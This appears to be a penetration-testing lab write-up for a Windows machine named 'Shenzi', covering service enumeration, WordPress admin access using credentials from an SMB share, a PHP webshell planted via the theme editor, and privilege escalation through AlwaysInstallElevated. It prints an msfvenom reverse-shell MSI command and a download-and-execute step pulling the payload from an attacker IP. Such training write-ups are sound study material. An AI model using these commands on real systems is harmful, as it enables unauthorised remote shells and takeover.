---
title: Shenzi
date: 2025-11-13
---
Difficulty: Intermediate
# System Information
OS: Windows
IP: 192.168.194.55
Architecture: x64

---
# Service Discovery

## Open Ports & Priority
TCP Ports:
- [x] 21 - FileZilla Server version 0.9.41 beta
- [x] 80
- [x] 443
- [x] 445
- [ ] 139
- [ ] 3306
- [ ] 135
- [ ] 5040
- [ ] 49664
- [ ] 49665
- [ ] 49666
- [ ] 49667
- [ ] 49668
- [ ] 49669

# Service Enumeration
## 21
FileZilla Server version 0.9.41 beta

failed login attempts:
- anonymous:anonymous
- root:root
- shenzi:shenzi

BoF for 0.9.4x https://www.exploit-db.com/exploits/1336 (come back to later)

## 80
HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], OpenSSL[1.1.1g], PHP[7.4.6], 
- 2.4.x BoF... again, save for later https://www.exploit-db.com/exploits/51193

![[Pasted image 20251113184106.png]]
Default install of XAMPP for... Windows 7.4.6?! That's a very outdated OS if this is accurate.

http://shenzi/dashboard/phpinfo.php exposes phpinfo
- webroot: C:/xampp/apache
- Windows 10 AMD64
- **file_uploads: on**

Unable to access /phpmyadmin from outside localhost.

(Returning after [[#445]]) I entirely missed it initially but there is a wordpress instance on /shenzi!!! I tried shenzi:shenzi against FTP, but this is a good reminder to use the hostname in other points of enumeration...

/shenzi/wp-admin brings us to the login page, and the credentials discovered from SMB allow us to authenticate as admin (admin:FeltHeadwallWight357)

We can abuse this access in the typical way, by editing a theme to include a PHP payload and executing it.

For instance, edit the 404 page for a theme which isn't currently active:
http://shenzi/shenzi/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen

Add a webshell such as /usr/share/webshells/php/simple-backdoor.php to the top of the PHP source, then save.
![[Pasted image 20251113204803.png]]

Finally, run it by making a request to:
http://shenzi/shenzi/wp-content/themes/twentyseventeen/404.php?cmd=whoami

![[Pasted image 20251113204854.png]]

We can gain initial access by executing 

## 443
Seems to be the same web root and available pages as port 80.

## 445

`smbclient -N -L \\\\$IP\\`

![[Pasted image 20251113185730.png]]

"Shenzi" share is interesting.

![[Pasted image 20251113191327.png]]

passwords.txt - some default and non-default passwords for XAMPP services.
Nothing immediately useful as most services are internal only. Tested against FTP.

![[Pasted image 20251113192711.png]]

Eventually find this referenced wordpress instance on /shenzi on ports 80/443. Return to [[#80]] to continue exploitation, or jump directly to [[#Initial Access]] below...

# Initial Access

Log into wordpress at :80/shenzi/wp-admin with Admin:FeltHeadwallWight357.

Edit a theme to upload a webshell and gain RCE, establish a reverse shell.

# Privilege Escalation

winPEASx64.exe
- `AlwaysInstallElevated set to 1 in HKLM!`

AlwaysInstallElevated should be a direct path to SYSTEM.

Make an MSI payload, upload the the target, and run it to catch a shell.

Attacking:
`penelope -p 443`
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.216 LPORT=443 -f msi -o shell.msi`

Victim:
`iwr 192.168.45.216/shell.msi -o shell.msi`
`.\shell.msi`

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20251113220032.png]]
